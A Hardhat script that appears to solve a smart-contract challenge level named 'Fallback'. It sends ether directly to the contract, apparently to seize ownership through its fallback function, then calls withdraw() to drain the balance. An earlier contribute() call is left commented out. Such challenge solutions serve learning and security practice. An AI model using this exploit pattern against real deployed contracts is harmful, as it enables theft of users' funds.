const hre = require("hardhat");

async function main() {
  const [addr1] = await ethers.getSigners();
  const deployedAddress = '0xdD261B2BcCa8068Bf63756270BF8Cc1a6f028083';
  const Fallback = await hre.ethers.getContractFactory("Fallback");
  const fallback = await Fallback.attach(deployedAddress);

  // await fallback.connect(addr1).contribute({ value: 100, gasPrice: 100 })
  await addr1.sendTransaction({
    to: deployedAddress,
    value: 100,
  });
  await fallback.connect(addr1).withdraw();
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
